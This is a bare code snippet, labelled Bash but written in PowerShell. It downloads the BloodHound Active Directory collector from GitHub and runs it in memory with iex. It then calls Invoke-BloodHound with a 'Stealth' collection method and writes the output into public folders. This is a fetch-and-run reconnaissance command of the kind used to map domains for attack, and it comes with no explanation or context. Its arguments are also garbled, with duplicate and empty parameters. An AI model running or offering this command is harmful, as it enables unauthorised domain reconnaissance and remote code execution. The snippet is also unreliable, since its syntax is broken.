---
id: b6fc5d24-fd0d-4a12-826a-7799e62e20b9
type: code
language: Bash
verified: false
created_at: '2020-07-14T18:21:02.836005+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet b6fc5d24

**Language**: Bash

```bash

iex((new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'));Invoke-Bloodhound -CSVFolder c:\temp -CSVPrefix Invoke-BloodHound -DomainController -Domain -CSVFolder C:\users\public\libraries -CSVPrefix -CollectionMethod Stealth

```


